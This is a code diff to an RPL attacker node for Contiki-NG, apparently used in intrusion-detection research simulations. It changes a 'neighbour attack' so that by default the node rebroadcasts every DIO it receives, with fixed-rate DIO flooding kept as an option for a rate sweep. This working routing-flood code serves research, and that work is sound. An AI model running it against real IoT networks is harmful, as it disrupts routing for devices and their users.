@@ -1,5 +1,8 @@
-/* Neighbour attack: floods multicast DIOs on a timer while behaving
- * otherwise normally (joins RPL, sends CBR UDP). */
+/* Neighbour attack. ATTACK_REBROADCAST=1 (default) reproduces the paper: the
+ * attacker rebroadcasts every DIO it receives from its neighbours, so its rate
+ * follows ambient traffic. With ATTACK_REBROADCAST=0 it floods at a fixed
+ * ATTACK_PERIOD_MS instead, used only for the attack-rate sweep. The node
+ * otherwise behaves normally (joins RPL, sends CBR UDP). */
 #include "attacker-common.h"
 #include "net/routing/rpl-lite/rpl.h"
 #include "net/routing/rpl-lite/rpl-icmp6.h"
@@ -23,6 +26,11 @@ PROCESS_THREAD(attacker_process, ev, data)
   static uint8_t attacking;
   static char buf[16];
   uip_ipaddr_t root;
+#if ATTACK_REBROADCAST
+  /* Drain the rebroadcast queue eight times a second. */
+#define REBCAST_DRAIN_TICKS (CLOCK_SECOND / 8)
+  static uint8_t pending;
+#endif
 
   PROCESS_BEGIN();
 
@@ -54,25 +62,43 @@ PROCESS_THREAD(attacker_process, ev, data)
     if(ev == PROCESS_EVENT_TIMER && data == &atk_start_timer && !attacking) {
       attacking = 1;
       printf("ATK\tstart\t%s\t%u\n", ATTACK_TYPE, ATTACK_PERIOD_MS);
+#if ATTACK_REBROADCAST
+      ids_rebroadcast_enable(1);
+      etimer_set(&atk_timer, REBCAST_DRAIN_TICKS);
+#else
       etimer_set(&atk_timer, attack_next_delay());
+#endif
       if(ATTACK_DURATION_SEC > 0) {
         etimer_set(&atk_end_timer, ATTACK_DURATION_SEC * CLOCK_SECOND);
       }
     }
 
-    /* Inject one multicast DIO per tick while attacking. */
     if(attacking && ev == PROCESS_EVENT_TIMER && data == &atk_timer) {
+#if ATTACK_REBROADCAST
+      /* Emit one DIO per DIO received since the last tick. */
+      pending = ids_take_rebroadcast();
+      while(pending-- > 0 && curr_instance.used) {
+        rpl_icmp6_dio_output(NULL);
+        printf("ATK\tsend\t%s\t%lu\n", ATTACK_TYPE, (unsigned long)atk_sent++);
+      }
+      etimer_set(&atk_timer, REBCAST_DRAIN_TICKS);
+#else
       if(curr_instance.used) {
         rpl_icmp6_dio_output(NULL);
         printf("ATK\tsend\t%s\t%lu\n", ATTACK_TYPE, (unsigned long)atk_sent++);
       }
       etimer_set(&atk_timer, attack_next_delay());
+#endif
     }
 
     /* End the attack. */
     if(attacking && ATTACK_DURATION_SEC > 0 &&
        ev == PROCESS_EVENT_TIMER && data == &atk_end_timer) {
       attacking = 0;
+#if ATTACK_REBROADCAST
+      ids_rebroadcast_enable(0);
+      printf("ATK\tdropped\t%s\t%u\n", ATTACK_TYPE, ids_rebroadcast_dropped());
+#endif
       etimer_stop(&atk_timer);
       printf("ATK\tstop\t%s\t%lu\n", ATTACK_TYPE, (unsigned long)atk_sent);
     }
